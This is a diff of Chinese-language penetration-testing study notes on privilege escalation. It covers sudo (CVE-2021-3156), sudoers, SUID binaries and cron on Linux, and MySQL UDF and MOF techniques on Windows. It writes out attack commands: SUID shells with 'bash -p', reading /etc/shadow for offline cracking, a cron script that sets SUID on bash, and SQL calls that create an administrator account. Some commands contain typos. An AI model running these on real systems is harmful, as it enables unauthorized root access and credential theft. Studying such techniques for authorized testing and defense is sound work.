@@ -4,46 +4,89 @@ linux提权
 
 2、sudo提权：
 （1）sudo漏洞提权
-对象：
-多用于debian或ubuntu中
-原理：
-  CVE-2021-3156
-  将用户添加到有sudo权限的用户组
-利用方式：  
-sudoedit -s / （sudoedit用管理员权限运行编辑器，-s表示启动shell，基本都会报错）  如果响应是 /：not a regular file 这种类似的响应结果，则可能存在漏洞
-github下载CVE-2021-3156利用的代码（c的），放到服务器上，编译后运行，如果条件符合的，可以提权为管理员
+  对象：
+    多用于debian或ubuntu中
+  原理：
+    CVE-2021-3156
+    将用户添加到有sudo权限的用户组
+  利用方式：  
+    sudoedit -s / （sudoedit用管理员权限运行编辑器，-s表示启动shell，基本都会报错）  如果响应是 /：not a regular file 这种类似的响应结果，则可能存在漏洞
+    github下载CVE-2021-3156利用的代码（c的），放到服务器上，编译后运行，如果条件符合的，可以提权为管理员
 
 （2）sudoer提权
-原理：
-linux上有些用户有权限使用sudo执行命令
-利用方式：
-  sudo -l 查看当前用户可以通过sudo执行哪些命令
-  visudo（修改sudo文件，sudo文件控制有哪些用户，可以通过sudo执行哪些命令）
-    username（用户名） ALL（ALL：ALL） NOPASSWD：/user/bin/firewall -cmd    表示username用户在任意机器上，以任意身份执行firewall命令
-  通过上面方式，产看有无命令配置错误，可以以root身份，执行有风险的命令，如cat、find
+  原理：
+    linux上有些用户有权限使用sudo执行命令
+  利用方式：
+    sudo -l 查看当前用户可以通过sudo执行哪些命令
+    visudo（修改sudo文件，sudo文件控制有哪些用户，可以通过sudo执行哪些命令）
+      username（用户名） ALL（ALL：ALL） NOPASSWD：/user/bin/firewall -cmd    表示username用户在任意机器上，以任意身份执行firewall命令
+    通过上面方式，产看有无命令配置错误，可以以root身份，执行有风险的命令，如cat、find
 
 3、suid提权：
-原理：
-  文件权限包括rwx，如果x位写的是s（rws），表示该文件在执行时，是以文件所有者身份执行
-  linux中一切皆文件，cat，find等命令也是文件
-  通过where cat，查询文件，修改文件权限即可（被加s权限的文件，会标红警告，提权完之后应该将权限改回去）
-利用方式：
-find / -perm -u=s 2> /dev/null（2表示标准错误，将错误输出到dev/null表示将错误屏蔽）  查找所有拥有s权限的命令，查看是否有利用方式（可以通过对比linux默认状态下开放s权限的命令，如果有多的，查看是否有利用方式），比如：
-cat：cat passwd和shadow文件，对shadow文件进行解密（离线爆破）
-find： find /etc/passwd（任意文件） -exec bash -p \;   （其中分号是用于bash命令的结束符，反斜线用来转义，防止分号被解释为其他）直接进入bash终端
-bash： bash -p 直接进入bash终端
-env: env bash -p 直接进入bash终端
-curl： curl file：///etc/shadow 用法和cat类似
+  原理：
+    文件权限包括rwx，如果x位写的是s（rws），表示该文件在执行时，是以文件所有者身份执行
+    linux中一切皆文件，cat，find等命令也是文件
+    通过where cat，查询文件，修改文件权限即可（被加s权限的文件，会标红警告，提权完之后应该将权限改回去）
+  利用方式：
+    find / -perm -u=s 2> /dev/null（2表示标准错误，将错误输出到dev/null表示将错误屏蔽）  查找所有拥有s权限的命令，查看是否有利用方式（可以通过对比linux默认状态下开放s权限的命令，如果有多的，查看是否有利用方式），比如：
+    cat：cat passwd和shadow文件，对shadow文件进行解密（离线爆破）
+    find： find /etc/passwd（任意文件） -exec bash -p \;   （其中分号是用于bash命令的结束符，反斜线用来转义，防止分号被解释为其他）直接进入bash终端
+    bash： bash -p 直接进入bash终端
+    env: env bash -p 直接进入bash终端
+    curl： curl file：///etc/shadow 用法和cat类似
 
 4、contab定时任务提权
-原理：
-通过向定时任务（root权限执行的那种），写入提权指令，定时任务执行后提权成功。
-场景：
-有些web提供类似功能，比如定时扫面，定时发送之类的，定时任务通常由root权限执行。可能存在
-利用方式：
-contab -l 或者 cat /var/spool/cron/root
-定时任务中写入： */1**** /opt/learn/site_check.sh
-site_check.sh中写入： chmod u+s /bin/bash
+  原理：
+    通过向定时任务（root权限执行的那种），写入提权指令，定时任务执行后提权成功。
+  场景：
+    有些web提供类似功能，比如定时扫面，定时发送之类的，定时任务通常由root权限执行。可能存在
+  利用方式：
+    contab -l 或者 cat /var/spool/cron/root
+    定时任务中写入： */1**** /opt/learn/site_check.sh
+    site_check.sh中写入： chmod u+s /bin/bash
+  
+
+Windows提权
+
+
+mysql提权：
+
+UDF提权：
+
+  原理：
+    mysql允许用户自定义函数，通过mysql的写权限，写入自定义函数，用来执行系统命令
+  
+  前提：
+    可以远程登录mysql
+    show veriables like "priv"  # 确定mysql有任意文件的写权限，拥有任意路径的写权限
+  
+  利用方式：
+  1、show veriables like "plugin"  # 确认mysql的插件目录，并由此推断http的主目录
+    select * from musql.func where name = "sys_exec";  # 确认系统中不存在sys_exec函数，需要用户使用udf自行定义
+  2、使用msf的udf利用模块，上传ddl文件，文件内容是上传一个用户自定义函数（udf），这里直接查msf如何使用udf即可。这里再执行第二步，就可以查到新增了这个函数。
+  3、返回mysql，使用写入和自定义函数“sys_exec”执行系统命令，这里为什么msf不完成全部工作，是因为msf实现不了了，需要后续手动调用
+    这时执行命令，会发现命令没有返回值，只返回0，1 ，0表示执行成功，
+    如果需要返回值，执行 create function sys_eval returns string soname "pVnzEjux.dll"; 
+    在执行重新创建的函数 sys_eval，就有返回值了
+  4、创建新用户，提权为管理员
+    select sys_eval("net user hh 12345 /add");
+    select sys_eval("net localgroup /add administrator hh0");
+
+MOF提权：
+
+  原理：
+    MOF是一种托管对象格式（Managed Object Format），是一种文件类型，它（nullevt.mof）再C:\WINDOWS\system32\wbem\mof\路径下将会每隔一段时间，以system的身份，执行一次。
+    通过root权限下的mysql，将文件写入该路径下，执行后达到提权的效果
+    
+  前提：
+    mysql允许远程登录
+    secure_file_priv的值为空
+    
+  利用方式：
+    直接调用msf中的mof模块即可，可以直接查mof模块如何再msf中利用
+  
+  
+
 
 
 
